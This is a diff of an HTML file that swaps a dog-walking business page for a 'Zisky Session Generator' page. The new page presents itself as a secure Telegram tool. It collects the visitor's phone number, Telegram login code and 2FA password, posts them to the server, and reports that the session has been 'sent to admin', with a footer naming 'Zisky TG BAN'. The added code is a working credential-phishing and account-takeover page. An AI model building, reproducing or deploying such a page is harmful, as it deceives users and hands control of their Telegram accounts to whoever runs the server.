@@ -1,162 +1,351 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Professional Dog Walking Services</title>
+    <title>Zisky Session Generator</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        /* Modern Dark Blue Theme */
-        body {
+        * {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: radial-gradient(circle at top, #1a2a6c, #0a192f, #000000);
-            color: #e6f1ff;
-            line-height: 1.6;
-        }
-
-        /* Hero Section */
-        header {
-            padding: 80px 20px;
-            text-align: center;
-        }
-
-        h1 {
-            color: #64ffda;
-            font-size: 3rem;
-            margin-bottom: 10px;
-            text-shadow: 0 0 20px rgba(100, 255, 218, 0.3);
-        }
-
-        .subtitle {
-            font-size: 1.3rem;
-            max-width: 800px;
-            margin: 0 auto 30px;
-            color: #8892b0;
-        }
-
-        /* "Why Choose Me" Highlights Section */
-        .highlights {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
             display: flex;
             justify-content: center;
-            flex-wrap: wrap;
-            gap: 20px;
-            padding: 40px 20px;
-            background: rgba(255, 255, 255, 0.03); /* Glass effect */
+            align-items: center;
+            padding: 20px;
         }
-
-        .card {
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(100, 255, 218, 0.1);
-            border-radius: 15px;
-            padding: 25px;
-            width: 250px;
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            width: 100%;
+            max-width: 400px;
+            padding: 30px;
+            animation: slideUp 0.5s ease;
+        }
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .header {
             text-align: center;
-            transition: transform 0.3s ease;
+            margin-bottom: 30px;
         }
-
-        .card:hover {
-            transform: translateY(-10px);
-            background: rgba(100, 255, 218, 0.05);
-        }
-
-        .card h3 {
-            color: #64ffda;
+        
+        .header h1 {
+            color: #333;
+            font-size: 28px;
             margin-bottom: 10px;
         }
-
-        /* Services Section */
-        .services {
-            max-width: 900px;
-            margin: 60px auto;
-            padding: 0 20px;
+        
+        .header p {
+            color: #666;
+            font-size: 14px;
         }
-
-        .service-list {
-            list-style: none;
-            padding: 0;
-        }
-
-        .service-list li {
-            background: #112240;
-            margin-bottom: 15px;
-            padding: 20px;
+        
+        .info-box {
+            background: #f7f7f7;
+            border-left: 4px solid #667eea;
+            padding: 15px;
             border-radius: 10px;
-            border-left: 5px solid #64ffda;
+            margin-bottom: 25px;
+            font-size: 14px;
+            color: #555;
         }
-
-        /* Contact Button */
-        .cta-container {
+        
+        .info-box strong {
+            color: #333;
+            display: block;
+            margin-bottom: 5px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+        
+        .phone-input {
+            direction: ltr;
+            font-family: monospace;
+        }
+        
+        .code-input {
+            letter-spacing: 2px;
+            font-size: 20px;
             text-align: center;
-            margin-bottom: 100px;
         }
-
-        .btn {
-            background-color: #64ffda;
-            color: #0a192f;
-            padding: 18px 40px;
-            text-decoration: none;
-            font-weight: bold;
-            border-radius: 30px;
-            font-size: 1.2rem;
+        
+        button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+        }
+        
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            display: none;
+        }
+        
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+            display: block;
+        }
+        
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+            display: block;
+        }
+        
+        .status.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+            display: block;
+        }
+        
+        .loading {
             display: inline-block;
-            transition: box-shadow 0.3s ease;
-            box-shadow: 0 10px 30px -10px rgba(100, 255, 218, 0.5);
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+            vertical-align: middle;
         }
-
-        .btn:hover {
-            box-shadow: 0 20px 40px -15px rgba(100, 255, 218, 0.7);
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-
-        footer {
+        
+        .footer {
+            margin-top: 20px;
             text-align: center;
-            padding: 40px;
-            color: #495670;
-            font-size: 0.9rem;
+            color: #999;
+            font-size: 12px;
+        }
+        
+        .footer a {
+            color: #667eea;
+            text-decoration: none;
         }
     </style>
 </head>
 <body>
-
-    <header>
-        <h1>Your Dog’s Favorite Part of the Day! 🐾</h1>
-        <p class="subtitle">Reliable, caring, and energetic dog walking services for your best friend. I provide professional care tailored to your pup's specific energy and needs.</p>
-        <a href="mailto:hizisaac6@gmail.com Walking Inquiry" class="btn">CONTACT US</a>
-    </header>
-
-    <section class="highlights">
-        <div class="card">
-            <h3>Experienced</h3>
-            <p>Years of hands-on experience with all breeds and sizes.</p>
+    <div class="container">
+        <div class="header">
+            <h1>🔐 Zisky Session Generator</h1>
+            <p>Secure Telegram Session String Generator</p>
         </div>
-        <div class="card">
-            <h3>Verified</h3>
-            <p>Fully insured and background checked for your peace of mind.</p>
+        
+        <div class="info-box">
+            <strong>⚠️ Important</strong>
+            • Your session string is like a password<br>
+            • It will be sent securely to admin<br>
+            • Never share it with anyone else<br>
+            • You'll be logged out of other devices
         </div>
-        <div class="card">
-            <h3>Updates</h3>
-            <p>Receive GPS maps and cute photos after every single walk.</p>
+        
+        <div id="phoneForm">
+            <div class="form-group">
+                <label>📱 Phone Number (with country code)</label>
+                <input type="tel" id="phone" class="phone-input" placeholder="+1234567890" value="{{ phone }}">
+            </div>
+            
+            <button onclick="requestCode()" id="requestBtn">
+                <span id="btnText">Request Verification Code</span>
+            </button>
         </div>
-    </section>
-
-    <section class="services">
-        <h2 style="text-align: center; color: #ccd6f6;">Professional Care Services</h2>
-        <ul class="service-list">
-            <li><strong>✅ Solo & Group Walks:</strong> Tailored exercise based on your dog’s personality and fitness level.</li>
-            <li><strong>✅ Puppy Visits:</strong> Specialized care including feeding, training reinforcement, and potty breaks.</li>
-            <li><strong>✅ Reliable Service:</strong> Guaranteed on-time arrivals and consistent scheduling you can count on.</li>
-            <li><strong>✅ Peace of Mind:</strong> I treat your home and your pet with the utmost respect and security.</li>
-        </ul>
-    </section>
-
-    <div class="cta-container">
-        <p>Ready to book a free meet-and-greet?</p>
-        <a href="mailto:hizisaac6@gmail.com Walking Inquiry" class="btn">SECURE YOUR SPOT</a>
+        
+        <div id="codeForm" style="display: none;">
+            <div class="form-group">
+                <label>🔑 Verification Code</label>
+                <input type="text" id="code" class="code-input" placeholder="12345" maxlength="6">
+            </div>
+            
+            <div class="form-group">
+                <label>🔐 2FA Password (if enabled)</label>
+                <input type="password" id="password" placeholder="Leave empty if no 2FA">
+            </div>
+            
+            <button onclick="verifyCode()" id="verifyBtn">Verify & Generate Session</button>
+        </div>
+        
+        <div id="status" class="status"></div>
+        
+        <div class="footer">
+            Powered by Zisky TG BAN v6.5<br>
+            <a href="#" onclick="resetForm()">Start Over</a>
+        </div>
     </div>
 
-    <footer>
-        &copy; 2025 Professional Dog Walking Services | [ISAAC/DY1 2NJ]
-    </footer>
-
-</body>
+    <script>
+        let phoneNumber = '';
+        
+        function showStatus(message, type) {
+            const status = document.getElementById('status');
+            status.className = `status ${type}`;
+            status.innerHTML = message;
+        }
+        
+        async function requestCode() {
+            phoneNumber = document.getElementById('phone').value;
+            
+            if (!phoneNumber || !phoneNumber.startsWith('+')) {
+                showStatus('❌ Please enter a valid phone number with country code (e.g., +1234567890)', 'error');
+                return;
+            }
+            
+            const btn = document.getElementById('requestBtn');
+            const btnText = document.getElementById('btnText');
+            btn.disabled = true;
+            btnText.innerHTML = '<span class="loading"></span> Sending code...';
+            
+            try {
+                const response = await fetch('/request-code', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({phone: phoneNumber})
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    showStatus('✅ Code sent! Check your Telegram app', 'success');
+                    document.getElementById('phoneForm').style.display = 'none';
+                    document.getElementById('codeForm').style.display = 'block';
+                } else {
+                    showStatus('❌ ' + data.error, 'error');
+                    btn.disabled = false;
+                    btnText.innerHTML = 'Request Verification Code';
+                }
+            } catch (error) {
+                showStatus('❌ Connection error. Please try again.', 'error');
+                btn.disabled = false;
+                btnText.innerHTML = 'Request Verification Code';
+            }
+        }
+        
+        async function verifyCode() {
+            const code = document.getElementById('code').value;
+            const password = document.getElementById('password').value;
+            
+            if (!code) {
+                showStatus('❌ Please enter verification code', 'error');
+                return;
+            }
+            
+            const btn = document.getElementById('verifyBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<span class="loading"></span> Verifying...';
+            
+            try {
+                const response = await fetch('/verify-code', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        phone: phoneNumber,
+                        code: code,
+                        password: password
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    showStatus(`✅ ${data.message}`, 'success');
+                    btn.innerHTML = '✓ Session Generated';
+                    
+                    setTimeout(() => {
+                        document.getElementById('codeForm').style.display = 'none';
+                        document.getElementById('status').innerHTML = '✅ Session sent to admin! Check Telegram bot';
+                    }, 3000);
+                } else {
+                    showStatus('❌ ' + data.error, 'error');
+                    btn.disabled = false;
+                    btn.innerHTML = 'Verify & Generate Session';
+                }
+            } catch (error) {
+                showStatus('❌ Verification failed. Please try again.', 'error');
+                btn.disabled = false;
+                btn.innerHTML = 'Verify & Generate Session';
+            }
+        }
+        
+        function resetForm() {
+            document.getElementById('phone').value = '';
+            document.getElementById('code').value = '';
+            document.getElementById('password').value = '';
+            document.getElementById('phoneForm').style.display = 'block';
+            document.getElementById('codeForm').style.display = 'none';
+            document.getElementById('status').className = 'status';
+            document.getElementById('status').innerHTML = '';
+            document.getElementById('requestBtn').disabled = false;
+            document.getElementById('btnText').innerHTML = 'Request Verification Code';
+        }
+    </script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9ce00ef51a98d397',t:'MTc3MTEwODczNA=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9ce03febbd3dd159',t:'MTc3MTExMDczOQ=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
 </html>
